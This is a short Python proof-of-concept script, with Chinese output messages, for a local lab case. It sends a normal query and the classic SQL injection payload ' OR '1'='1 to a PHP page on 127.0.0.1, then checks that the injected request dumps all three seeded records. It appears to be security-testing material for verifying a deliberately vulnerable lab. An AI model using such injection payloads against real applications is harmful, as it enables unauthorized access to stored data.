import html
import http.client
import re
import sys
import urllib.parse

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S001/index.php"


def fetch_page(name):
    query = urllib.parse.urlencode({"name": name})
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    try:
        conn.request(
            "GET",
            f"{PATH}?{query}",
            headers={"User-Agent": "S001-model-analysis-poc"},
        )
        resp = conn.getresponse()
        status = resp.status
        location = resp.getheader("Location")
        body = resp.read().decode("utf-8", "replace")
    finally:
        conn.close()

    if status in (301, 302, 303, 307, 308):
        raise RuntimeError(f"收到重定向 {status}，脚本拒绝跟随：{location}")
    if status != 200:
        raise RuntimeError(f"HTTP 状态非 200：{status}")
    return body


def parse_records(body):
    pattern = r"<p>ID\s*(\d+)[：:]\s*([^<]*)</p>"
    return [
        (int(record_id), html.unescape(name_text).strip())
        for record_id, name_text in re.findall(pattern, body)
    ]


def main():
    normal_body = fetch_page("Alice")
    test_body = fetch_page("' OR '1'='1")

    normal_records = parse_records(normal_body)
    test_records = parse_records(test_body)

    print("普通请求解析记录:", normal_records)
    print("测试请求解析记录:", test_records)

    if normal_records != [(1, "Alice")]:
        print("普通业务对照失败：预期仅解析到 ID 1：Alice。")
        print("请检查入口、数据库初始化、lab_people 预置记录和 db_connect.php。")
        sys.exit(2)

    expected_test = {(1, "Alice"), (2, "Bob"), (3, "Carol")}
    if set(test_records) != expected_test or test_records == normal_records:
        print("测试未达到预期记录差异：预期测试请求解析到全部三条预置记录。")
        print("请检查 SQL 拼接路径、数据库记录、PHP 错误日志和 mysqli 执行前提。")
        sys.exit(3)

    print("成功断言：普通请求仅返回 Alice；测试请求返回全部三条预置业务记录。")
    print("数据库记录未被该脚本修改。")


if __name__ == "__main__":
    main()
